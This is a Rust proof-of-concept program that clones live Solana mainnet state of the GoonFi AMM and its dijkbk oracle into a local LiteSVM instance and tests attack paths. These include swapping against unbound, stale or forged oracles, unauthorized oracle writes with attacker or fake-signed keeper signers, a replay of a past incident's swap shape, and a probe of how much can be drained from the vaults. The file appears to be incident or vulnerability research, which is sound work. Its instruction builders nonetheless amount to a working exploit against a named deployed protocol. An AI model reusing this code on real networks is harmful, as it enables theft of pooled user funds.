// GoonFi Z3-H2 LiteSVM PoC — clone live mainnet state, test the swap path, oracle binding,
// freshness, denom handling and the dijkbk oracle-write gate.
// READ-ONLY: nothing is signed or sent to any network. All execution is in-process (LiteSVM).
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use litesvm::LiteSVM;
use solana_account::Account;
use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_message::Message;
use solana_signer::Signer;
use solana_transaction::Transaction;
use std::{collections::HashMap, str::FromStr};

const GOONFI: &str = "goonuddtQRrWqqn5nFyczVKaie28f3kDkHWkHtURSLE";
const DIJKBK: &str = "dijkbkCAKfFTCxQg3u1pg82gVU1jJGHBBRcteD11mBu";
const TOKEN: &str = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const CLOCK: &str = "SysvarC1ock11111111111111111111111111111111";
const SYSVAR_OWNER: &str = "Sysvar1111111111111111111111111111111111111";
const IX_SYSVAR: &str = "Sysvar1nstructions1111111111111111111111111";
const LRS: &str = "SysvarLastRestartS1ot1111111111111111111111";
const SYSTEM: &str = "11111111111111111111111111111111";

fn a(s: &str) -> Address {
    Address::from_str(s).unwrap()
}

struct Env {
    svm: LiteSVM,
    accounts: HashMap<String, Address>,
}

fn u64_at(data: &[u8], off: usize) -> u64 {
    u64::from_le_bytes(data[off..off + 8].try_into().unwrap())
}

fn set_clock(env: &mut Env, slot: u64, ts: i64) {
    let mut cdata = Vec::with_capacity(40);
    cdata.extend_from_slice(&slot.to_le_bytes());
    cdata.extend_from_slice(&(ts - 120).to_le_bytes());
    cdata.extend_from_slice(&800u64.to_le_bytes());
    cdata.extend_from_slice(&800u64.to_le_bytes());
    cdata.extend_from_slice(&ts.to_le_bytes());
    env.svm
        .set_account(
            a(CLOCK),
            Account { lamports: 1_169_280, data: cdata, owner: a(SYSVAR_OWNER), executable: false, rent_epoch: 0 },
        )
        .unwrap();
}

fn load_env() -> Env {
    let mut svm = LiteSVM::new().with_sigverify(false).with_blockhash_check(false);
    let fx: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string("fixtures/accounts.json").unwrap()).unwrap();
    let mut accounts = HashMap::new();
    for (name, v) in fx.as_object().unwrap() {
        let addr = a(v["address"].as_str().unwrap());
        let owner = a(v["owner"].as_str().unwrap());
        let data = B64.decode(v["data_b64"].as_str().unwrap()).unwrap();
        let acc = Account {
            lamports: v["lamports"].as_u64().unwrap(),
            data,
            owner,
            executable: v["executable"].as_bool().unwrap(),
            rent_epoch: 0,
        };
        svm.set_account(addr, acc).unwrap();
        accounts.insert(name.clone(), addr);
    }
    svm.add_program(a(GOONFI), &std::fs::read("fixtures/goonfi.elf").unwrap()).unwrap();
    svm.add_program(a(DIJKBK), &std::fs::read("fixtures/dijkbk.elf").unwrap()).unwrap();
    let mut lrs = Vec::with_capacity(8);
    lrs.extend_from_slice(&246_464_040u64.to_le_bytes());
    svm.set_account(
        a(LRS),
        Account { lamports: 1_169_280, data: lrs, owner: a(SYSVAR_OWNER), executable: false, rent_epoch: 0 },
    )
    .unwrap();
    let mut env = Env { svm, accounts };
    let oracle = env.svm.get_account(&env.accounts["goonfi_oracle"]).unwrap();
    let o_slot = u32::from_le_bytes(oracle.data[16..20].try_into().unwrap()) as u64;
    let o_ts = u64_at(&oracle.data, 24) / 1000;
    println!("fixture oracle: slot={} ts={}", o_slot, o_ts);
    set_clock(&mut env, o_slot + 5, o_ts as i64 + 2);
    env
}

fn token_amount(env: &Env, addr: &Address) -> u64 {
    match env.svm.get_account(addr) {
        Some(acc) if acc.data.len() >= 72 => u64_at(&acc.data, 64),
        _ => 0,
    }
}

fn token_acc_data(mint: &Address, owner: &Address, amount: u64, native_reserve: Option<u64>) -> Vec<u8> {
    let mut d = vec![0u8; 165];
    d[0..32].copy_from_slice(mint.as_ref());
    d[32..64].copy_from_slice(owner.as_ref());
    d[64..72].copy_from_slice(&amount.to_le_bytes());
    d[108] = 1;
    if let Some(r) = native_reserve {
        d[109..113].copy_from_slice(&1u32.to_le_bytes());
        d[113..121].copy_from_slice(&r.to_le_bytes());
    }
    d
}

fn setup_attacker(env: &mut Env, mint_a: &Address, mint_b: &Address, a_amt: u64, b_amt: u64) -> (Keypair, Address, Address, Address) {
    let user = Keypair::new();
    let upk = user.pubkey();
    env.svm
        .set_account(upk, Account { lamports: 100_000_000_000, data: vec![], owner: a(SYSTEM), executable: false, rent_epoch: 0 })
        .unwrap();
    let ata_prog = a("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
    let (ua, _) = Address::find_program_address(&[upk.as_ref(), a(TOKEN).as_ref(), mint_a.as_ref()], &ata_prog);
    let (ub, _) = Address::find_program_address(&[upk.as_ref(), a(TOKEN).as_ref(), mint_b.as_ref()], &ata_prog);
    let rent = 2_039_280u64;
    let is_wsol = mint_a == &a("So11111111111111111111111111111111111111112");
    env.svm
        .set_account(ua, Account {
            lamports: a_amt + if is_wsol { rent } else { 0 },
            data: token_acc_data(mint_a, &upk, a_amt, if is_wsol { Some(rent) } else { None }),
            owner: a(TOKEN), executable: false, rent_epoch: 0,
        })
        .unwrap();
    let is_wsol_b = mint_b == &a("So11111111111111111111111111111111111111112");
    env.svm
        .set_account(ub, Account {
            lamports: b_amt + if is_wsol_b { rent } else { 0 },
            data: token_acc_data(mint_b, &upk, b_amt, if is_wsol_b { Some(rent) } else { None }),
            owner: a(TOKEN), executable: false, rent_epoch: 0,
        })
        .unwrap();
    (user, upk, ua, ub)
}

#[derive(Clone)]
struct SwapAccounts {
    user: Address,
    pool: Address,
    vault_a: Address,
    vault_b: Address,
    user_a: Address,
    user_b: Address,
    mint_a: Address,
    mint_b: Address,
    oracle: Address,
    global: Address,
}

/// data: [tag=1][direction][amount u64][min_out u64][(optional trailing byte(s))]
fn build_swap_ix(sa: &SwapAccounts, direction: u8, amount: u64, min_out: u64, trailing: usize) -> Instruction {
    let mut data = Vec::new();
    data.push(1u8);
    data.push(direction);
    data.extend_from_slice(&amount.to_le_bytes());
    data.extend_from_slice(&min_out.to_le_bytes());
    for _ in 0..trailing {
        data.push(0u8);
    }
    let metas = vec![
        AccountMeta::new(sa.user, true),
        AccountMeta::new(sa.pool, false),
        AccountMeta::new(sa.user_a, false),
        AccountMeta::new(sa.user_b, false),
        AccountMeta::new(sa.vault_a, false),
        AccountMeta::new(sa.vault_b, false),
        AccountMeta::new_readonly(sa.mint_a, false),
        AccountMeta::new_readonly(sa.mint_b, false),
        AccountMeta::new_readonly(sa.oracle, false),
        AccountMeta::new_readonly(sa.global, false),
        AccountMeta::new_readonly(a(IX_SYSVAR), false),
        AccountMeta::new_readonly(a(TOKEN), false),
        AccountMeta::new_readonly(a(TOKEN), false),
    ];
    Instruction { program_id: a(GOONFI), accounts: metas, data }
}

fn send(env: &mut Env, user: &Keypair, ixs: Vec<Instruction>) -> Result<litesvm::types::TransactionMetadata, litesvm::types::FailedTransactionMetadata> {
    let msg = Message::new(&ixs, Some(&user.pubkey()));
    let tx = Transaction::new(&[user], msg, env.svm.latest_blockhash());
    env.svm.send_transaction(tx)
}

fn print_result(label: &str, res: &Result<litesvm::types::TransactionMetadata, litesvm::types::FailedTransactionMetadata>) -> bool {
    match res {
        Ok(meta) => {
            println!("[{}] SUCCESS cu={}", label, meta.compute_units_consumed);
            for l in &meta.logs {
                if l.contains("Program log") { println!("    log: {}", l); }
            }
            true
        }
        Err(f) => {
            println!("[{}] FAILED err={:?}", label, f.err);
            for l in &f.meta.logs {
                if l.contains("Program log") || l.contains("Error") { println!("    log: {}", l); }
            }
            false
        }
    }
}

fn oracle_info(env: &Env, oracle: &Address) -> (u64, u64, u64, u64, u64) {
    let d = env.svm.get_account(oracle).unwrap().data;
    (u64_at(&d, 0), u64_at(&d, 8), u32::from_le_bytes(d[16..20].try_into().unwrap()) as u64,
     u32::from_le_bytes(d[20..24].try_into().unwrap()) as u64, u64_at(&d, 24))
}

fn try_swap(env: &mut Env, user: &Keypair, sa: &SwapAccounts, label: &str, direction: u8, amount: u64, min_out: u64, trailing: usize) {
    let ba = token_amount(env, &sa.vault_a);
    let bb = token_amount(env, &sa.vault_b);
    let ua = token_amount(env, &sa.user_a);
    let ub = token_amount(env, &sa.user_b);
    let (p1, p2, oslot, denom, ts) = oracle_info(env, &sa.oracle);
    let ix = build_swap_ix(sa, direction, amount, min_out, trailing);
    let res = send(env, user, vec![ix]);
    let ok = print_result(label, &res);
    let na = token_amount(env, &sa.vault_a);
    let nb = token_amount(env, &sa.vault_b);
    let nua = token_amount(env, &sa.user_a);
    let nub = token_amount(env, &sa.user_b);
    println!(
        "    dir={} amt_in={} min_out={} | oracle P1={} P2={} slot={} denom={} ts={}",
        direction, amount, min_out, p1, p2, oslot, denom, ts
    );
    println!(
        "    vaultA d={} vaultB d={} | userA d={} userB d={}",
        na as i128 - ba as i128, nb as i128 - bb as i128, nua as i128 - ua as i128, nub as i128 - ub as i128
    );
    if ok {
        if direction == 0 {
            let out_b = (nb as i128 - bb as i128) as f64;
            if out_b > 0.0 { println!("    implied price B-raw per A-raw = {:.9}", out_b / amount as f64); }
        } else {
            let out_a = (na as i128 - ba as i128) as f64;
            if out_a > 0.0 { println!("    implied price B-raw per A-raw = {:.9}", amount as f64 / out_a); }
        }
    }
}

fn put_oracle(env: &mut Env, addr: Address, data: Vec<u8>) {
    env.svm.set_account(addr, Account { lamports: 1_000_000, data, owner: a(DIJKBK), executable: false, rent_epoch: 0 }).unwrap();
}

fn fake_addr(seed: u8) -> Address {
    Address::new_from_array([seed; 32])
}

fn main() {
    println!("=== GoonFi Z3-H2 LiteSVM PoC (read-only, local clone) ===");
    let mut env = load_env();
    let ws = env.accounts["mint_wsol"];
    let usdc = env.accounts["mint_usdc"];
    let (user, upk, uwsol, uusdc) = setup_attacker(&mut env, &ws, &usdc, 500_000_000_000, 1_000_000_000_000);
    println!("attacker={} wsol_ata={} usdc_ata={}", upk, uwsol, uusdc);

    let sa = SwapAccounts {
        user: upk,
        pool: env.accounts["goonfi_pool"],
        vault_a: env.accounts["goonfi_vault_wsol"],
        vault_b: env.accounts["goonfi_vault_usdc"],
        user_a: uwsol,
        user_b: uusdc,
        mint_a: ws,
        mint_b: usdc,
        oracle: env.accounts["goonfi_oracle"],
        global: env.accounts["goonfi_global"],
    };
    let (p1, p2, oslot, denom, ts) = oracle_info(&env, &sa.oracle);
    println!("GMCJ pool: vaultA(WSOL)={} vaultB(USDC)={} oracle P1={} P2={} slot={} denom={} ts={}",
        token_amount(&env, &sa.vault_a), token_amount(&env, &sa.vault_b), p1, p2, oslot, denom, ts);

    println!("\n-- T0 xToY sell 1 WSOL (min_out=1)");
    try_swap(&mut env, &user, &sa, "T0", 0, 1_000_000_000, 1, 0);

    println!("\n-- T0b yToX sell 100 USDC (min_out=1)");
    try_swap(&mut env, &user, &sa, "T0b", 1, 100_000_000, 1, 0);

    println!("\n-- T1 incident-shape yToX 4,096 USDC (min_out=0, 18-byte data)");
    try_swap(&mut env, &user, &sa, "T1", 1, 4_096_000_000, 0, 0);
    println!("\n-- T1b incident exact 20-byte data (2 trailing zero bytes)");
    try_swap(&mut env, &user, &sa, "T1b", 1, 4_096_000_000, 0, 2);

    println!("\n-- T2 unbound-oracle matrix on pool GMCJ (own oracle P1={})", p1);
    let alt_oracles: [(&str, &str, u8, u64); 4] = [
        ("oracle_alt", "HYPE $82.07", 1, 100_000_000),        // buy WSOL priced at HYPE's price
        ("oracle_pengu", "PENGU $0.0076", 1, 100_000_000),    // extreme low price
        ("oracle_cbbtc", "cbBTC $82,288", 0, 1_000_000_000),  // extreme high price (sell WSOL)
        ("oracle_stale_wsol", "stale WSOL $83.6", 1, 100_000_000),
    ];
    for (name, label, dir, amt) in alt_oracles {
        let mut sa2 = sa.clone();
        sa2.oracle = env.accounts[name];
        let (ap1, ap2, aslot, adenom, ats) = oracle_info(&env, &sa2.oracle);
        println!("    [{}] oracle P1={} P2={} slot={} denom={} ts={}", label, ap1, ap2, aslot, adenom, ats);
        try_swap(&mut env, &user, &sa2, &format!("T2-{}", name), dir, amt, 0, 0);
    }

    println!("\n-- T3 stale-oracle test (own-oracle copy, slot -= 100,000)");
    let mut stale = env.svm.get_account(&sa.oracle).unwrap().data.clone();
    let old_slot = (oslot as u32).saturating_sub(100_000);
    stale[16..20].copy_from_slice(&old_slot.to_le_bytes());
    put_oracle(&mut env, fake_addr(0x51), stale);
    let mut sa_stale = sa.clone();
    sa_stale.oracle = fake_addr(0x51);
    try_swap(&mut env, &user, &sa_stale, "T3", 0, 1_000_000_000, 1, 0);

    println!("\n-- T4 denom=1 test (own-oracle copy, denom field = 1)");
    let mut d1 = env.svm.get_account(&sa.oracle).unwrap().data.clone();
    d1[20..24].copy_from_slice(&1u32.to_le_bytes());
    put_oracle(&mut env, fake_addr(0x52), d1);
    let mut sa_d1 = sa.clone();
    sa_d1.oracle = fake_addr(0x52);
    try_swap(&mut env, &user, &sa_d1, "T4", 0, 1_000_000_000, 1, 0);

    println!("\n-- T5 arbitrary oracle price (own-oracle copy)");
    for (label, price, dir, amt) in [
        ("T5a price=2,661,000 ($2.661, incident-implied)", 2_661_000u64, 1u8, 4_096_000_000u64),
        ("T5b price=2,661,000,000 ($2,661)", 2_661_000_000u64, 1, 4_096_000_000),
        ("T5c price=7,617 (PENGU-like)", 7_617u64, 1, 100_000_000),
    ] {
        let mut evil = env.svm.get_account(&sa.oracle).unwrap().data.clone();
        evil[0..8].copy_from_slice(&price.to_le_bytes());
        evil[8..16].copy_from_slice(&price.to_le_bytes());
        let addr = fake_addr(0x53);
        put_oracle(&mut env, addr, evil);
        let mut sa_evil = sa.clone();
        sa_evil.oracle = addr;
        println!("    [{}]", label);
        try_swap(&mut env, &user, &sa_evil, label, dir, amt, 0, 0);
    }

    println!("\n-- T6 dijkbk oracle-write gate");
    let target = env.accounts["goonfi_oracle"];
    let before = env.svm.get_account(&target).unwrap().data.clone();
    let evildata: Vec<u8> = (0..32).map(|i| if i % 2 == 0 { 0xAB } else { 0xCD }).collect();
    let ix = Instruction {
        program_id: a(DIJKBK),
        accounts: vec![AccountMeta::new_readonly(upk, true), AccountMeta::new(target, false)],
        data: evildata.clone(),
    };
    let res = send(&mut env, &user, vec![ix]);
    let ok = print_result("T6a", &res);
    let after = env.svm.get_account(&target).unwrap().data.clone();
    println!("    T6a oracle changed: {} (ok={})", before != after, ok);
    let extra = Keypair::new();
    env.svm.set_account(extra.pubkey(), Account { lamports: 1_000_000_000, data: vec![], owner: a(SYSTEM), executable: false, rent_epoch: 0 }).unwrap();
    let ix2 = Instruction {
        program_id: a(DIJKBK),
        accounts: vec![AccountMeta::new_readonly(extra.pubkey(), true), AccountMeta::new(target, false)],
        data: evildata.clone(),
    };
    let msg = Message::new(&[ix2], Some(&extra.pubkey()));
    let tx = Transaction::new(&[&extra], msg, env.svm.latest_blockhash());
    let res2 = env.svm.send_transaction(tx);
    let ok2 = print_result("T6b", &res2);
    let after2 = env.svm.get_account(&target).unwrap().data.clone();
    println!("    T6b oracle changed: {} (ok={})", after != after2, ok2);
    if after2 != after {
        println!("    T6b new oracle data: {}", after2.iter().map(|b| format!("{:02x}", b)).collect::<String>());
    }
    // T6c: real instruction-data shape from a live keeper tx (32-byte price payload), attacker signer
    let mut real_payload = vec![0u8; 32];
    real_payload[0..8].copy_from_slice(&1_000_000_000u64.to_le_bytes());
    real_payload[8..16].copy_from_slice(&1_000_000_000u64.to_le_bytes());
    real_payload[16..20].copy_from_slice(&(oslot as u32).to_le_bytes());
    real_payload[20..24].copy_from_slice(&1_000_000u32.to_le_bytes());
    real_payload[24..32].copy_from_slice(&(ts + 1000).to_le_bytes());
    let ix3 = Instruction {
        program_id: a(DIJKBK),
        accounts: vec![AccountMeta::new_readonly(upk, true), AccountMeta::new(target, false)],
        data: real_payload.clone(),
    };
    let res3 = send(&mut env, &user, vec![ix3]);
    let ok3 = print_result("T6c", &res3);
    let after3 = env.svm.get_account(&target).unwrap().data.clone();
    println!("    T6c oracle changed: {} (ok={})", after2 != after3, ok3);

    // T6d: the REAL keeper pubkey as a (fake-signed, sigverify=false) signer — control
    println!("    -- T6d keeper pubkey as fake signer (control)");
    let keeper = a("FTp1BybZ51NiZKbnZH6MsrV3tUZNauhpQMbBcqYUEr5f");
    env.svm.set_account(keeper, Account { lamports: 20_000_000_000, data: vec![], owner: a(SYSTEM), executable: false, rent_epoch: 0 }).unwrap();
    let before4 = env.svm.get_account(&target).unwrap().data.clone();
    let ix4 = Instruction {
        program_id: a(DIJKBK),
        accounts: vec![AccountMeta::new_readonly(keeper, true), AccountMeta::new(target, false)],
        data: real_payload.clone(),
    };
    let msg4 = Message::new(&[ix4], Some(&keeper));
    let mut tx4 = Transaction::new_unsigned(msg4);
    tx4.signatures = vec![Default::default(); tx4.message.header.num_required_signatures as usize];
    let res4 = env.svm.send_transaction(tx4);
    println!("    T6d result: {:?}", res4.as_ref().map(|m| m.compute_units_consumed).map_err(|e| format!("{:?}", e.err)));
    if let Ok(m) = &res4 { for l in &m.logs { println!("      log: {}", l); } }
    if let Err(e) = &res4 { for l in &e.meta.logs { println!("      log: {}", l); } }
    let after4 = env.svm.get_account(&target).unwrap().data.clone();
    println!("    T6d oracle changed: {}", before4 != after4);
    if after4 != before4 {
        println!("    T6d new oracle data: {}", after4.iter().map(|b| format!("{:02x}", b)).collect::<String>());
    }

    // T6e: no accounts at all (program only)
    let ix5 = Instruction { program_id: a(DIJKBK), accounts: vec![], data: vec![1u8; 32] };
    let res5 = send(&mut env, &user, vec![ix5]);
    println!("    T6e (no accounts) result: {:?}", res5.as_ref().map(|m| m.compute_units_consumed).map_err(|e| format!("{:?}", e.err)));
    if let Ok(m) = &res5 { for l in &m.logs { println!("      log: {}", l); } }
    if let Err(e) = &res5 { for l in &e.meta.logs { println!("      log: {}", l); } }

    // ---- T6f matrix: isolate the gate (pubkey vs writable-flag) ----
    println!("    -- T6f gate matrix (forced write: payload ts differs)");
    let mut mk_payload = |ts_off: u64| {
        let mut p = vec![0u8; 32];
        p[0..8].copy_from_slice(&777_000_000u64.to_le_bytes());
        p[8..16].copy_from_slice(&777_000_000u64.to_le_bytes());
        p[16..20].copy_from_slice(&(oslot as u32).to_le_bytes());
        p[20..24].copy_from_slice(&1_000_000u32.to_le_bytes());
        p[24..32].copy_from_slice(&(ts + ts_off).to_le_bytes());
        p
    };
    let mut try_write = |env: &mut Env, signer: Address, signer_writable: bool, payload: Vec<u8>, label: &str| {
        let before = env.svm.get_account(&target).unwrap().data.clone();
        let meta0 = if signer_writable { AccountMeta::new(signer, true) } else { AccountMeta::new_readonly(signer, true) };
        let ix = Instruction { program_id: a(DIJKBK), accounts: vec![meta0, AccountMeta::new(target, false)], data: payload };
        let msg = Message::new(&[ix], Some(&signer));
        let mut tx = Transaction::new_unsigned(msg);
        tx.signatures = vec![Default::default(); tx.message.header.num_required_signatures as usize];
        let res = env.svm.send_transaction(tx);
        let after = env.svm.get_account(&target).unwrap().data.clone();
        let changed = before != after;
        println!("      [{}] writable_signer={} -> {:?} changed={}", label, signer_writable,
            res.as_ref().map(|m| m.compute_units_consumed).map_err(|e| format!("{:?}", e.err)), changed);
        if changed {
            println!("         new data: {}", after.iter().map(|b| format!("{:02x}", b)).collect::<String>());
        }
        changed
    };
    let other = Keypair::new();
    env.svm.set_account(other.pubkey(), Account { lamports: 5_000_000_000, data: vec![], owner: a(SYSTEM), executable: false, rent_epoch: 0 }).unwrap();
    let o_pk = other.pubkey();
    let mut off = 5000u64;
    for (signer, w, label) in [(keeper, true, "keeper-SW"), (keeper, false, "keeper-S"),
                               (upk, true, "attacker-SW"), (upk, false, "attacker-S"), (o_pk, true, "fresh-SW")] {
        off += 1000;
        try_write(&mut env, signer, w, mk_payload(off), label);
    }

    println!("\n-- T7 pool2 (TRUMP/USDC) with WSOL oracle (cross-market binding)");
    let mint_6p6x = env.accounts["mint_6p6x"];
    let (user2, upk2, u2a, u2b) = setup_attacker(&mut env, &mint_6p6x, &usdc, 1_000_000_000_000, 1_000_000_000_000);
    let pool2 = env.accounts["goonfi_pool2"];
    let vault2a = env.accounts["goonfi_vault2_a"];
    let vault2b = env.accounts["goonfi_vault2_b"];
    let oracle_gmcj = env.accounts["goonfi_oracle"];
    let oracle2 = env.accounts["goonfi_oracle2"];
    let global = env.accounts["goonfi_global"];
    let sa2 = SwapAccounts {
        user: upk2,
        pool: pool2,
        vault_a: vault2a,
        vault_b: vault2b,
        user_a: u2a,
        user_b: u2b,
        mint_a: mint_6p6x,
        mint_b: usdc,
        oracle: oracle_gmcj,
        global,
    };
    let (qp1, qp2, qslot, qdenom, qts) = oracle_info(&env, &oracle2);
    println!("    pool2's own oracle P1={} P2={} slot={} denom={} ts={}", qp1, qp2, qslot, qdenom, qts);
    try_swap(&mut env, &user2, &sa2, "T7", 1, 100_000_000, 0, 0);

    println!("\n-- T8 pool2 baseline with its OWN oracle (control)");
    let mut sa2c = sa2.clone();
    sa2c.oracle = oracle2;
    try_swap(&mut env, &user2, &sa2c, "T8", 1, 100_000_000, 1, 0);

    // T9: freshness + price-bounds of the BOUND oracle (restore pristine fixture first)
    println!("\n-- T9 bound-oracle freshness + price bounds (restored)");
    let bound = env.accounts["goonfi_oracle"];
    let fx: serde_json::Value = serde_json::from_str(&std::fs::read_to_string("fixtures/accounts.json").unwrap()).unwrap();
    let orig = B64.decode(fx["goonfi_oracle"]["data_b64"].as_str().unwrap()).unwrap();
    let o_p1 = u64_at(&orig, 0);
    let o_s = u32::from_le_bytes(orig[16..20].try_into().unwrap());
    // T9a: stale slot (-1,000,000)
    let mut t = orig.clone();
    t[16..20].copy_from_slice(&o_s.saturating_sub(1_000_000).to_le_bytes());
    put_oracle(&mut env, bound, t);
    try_swap(&mut env, &user, &sa, "T9a-old-oracle", 0, 1_000_000_000, 1, 0);
    // T9b: clock 1,000,000 slots ahead of fresh oracle
    put_oracle(&mut env, bound, orig.clone());
    set_clock(&mut env, oslot + 1_000_005, ts as i64 + 400_000);
    try_swap(&mut env, &user, &sa, "T9b-clock-ahead", 0, 1_000_000_000, 1, 0);
    set_clock(&mut env, oslot + 5, ts as i64 + 2);
    // T9c/d/e: price deviations from the pool's own quote
    for (label, mult) in [("T9c-price+1pct", 1.01f64), ("T9d-price+5pct", 1.05), ("T9e-price+20pct", 1.20), ("T9f-price-5pct", 0.95), ("T9g-price-20pct", 0.80)] {
        let mut t = orig.clone();
        let np = (o_p1 as f64 * mult) as u64;
        t[0..8].copy_from_slice(&np.to_le_bytes());
        t[8..16].copy_from_slice(&np.to_le_bytes());
        put_oracle(&mut env, bound, t);
        try_swap(&mut env, &user, &sa, label, 0, 1_000_000_000, 1, 0);
    }
    // T9h: zero price
    let mut t = orig.clone();
    t[0..8].copy_from_slice(&0u64.to_le_bytes());
    t[8..16].copy_from_slice(&0u64.to_le_bytes());
    put_oracle(&mut env, bound, t);
    try_swap(&mut env, &user, &sa, "T9h-zero-price", 0, 1_000_000_000, 1, 0);
    // restore
    put_oracle(&mut env, bound, orig.clone());

    // T10: capacity probe — sizes within/above vault
    println!("\n-- T10 capacity probe (pristine oracle)");
    try_swap(&mut env, &user, &sa, "T10a-10WSOL", 0, 10_000_000_000, 1, 0);
    try_swap(&mut env, &user, &sa, "T10b-1000WSOL", 0, 1_000_000_000_000, 1, 0);

    println!("\n=== done ===");
}
